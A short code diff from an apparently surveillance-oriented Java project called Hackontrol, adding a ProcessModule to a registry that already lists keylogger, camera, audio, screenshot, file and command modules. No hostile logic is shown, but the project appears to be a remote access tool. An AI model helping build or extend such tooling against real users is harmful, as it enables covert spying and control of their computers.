@@ -5,6 +5,7 @@ import com.khopan.hackontrol.module.AudioModule;
 import com.khopan.hackontrol.module.CameraModule;
 import com.khopan.hackontrol.module.DialogModule;
 import com.khopan.hackontrol.module.HackontrolModule;
+import com.khopan.hackontrol.module.ProcessModule;
 import com.khopan.hackontrol.module.ScreenshotModule;
 import com.khopan.hackontrol.module.command.CommandModule;
 import com.khopan.hackontrol.module.control.ControlModule;
@@ -24,6 +25,7 @@ public class ModuleRegistry {
 		registry.register(Hackontrol.MODULE_REGISTRY, DialogModule.class);
 		registry.register(Hackontrol.MODULE_REGISTRY, FileModule.class);
 		registry.register(Hackontrol.MODULE_REGISTRY, KeyLoggerModule.class);
+		registry.register(Hackontrol.MODULE_REGISTRY, ProcessModule.class);
 		registry.register(Hackontrol.MODULE_REGISTRY, ScreenshotModule.class);
 	}
 }
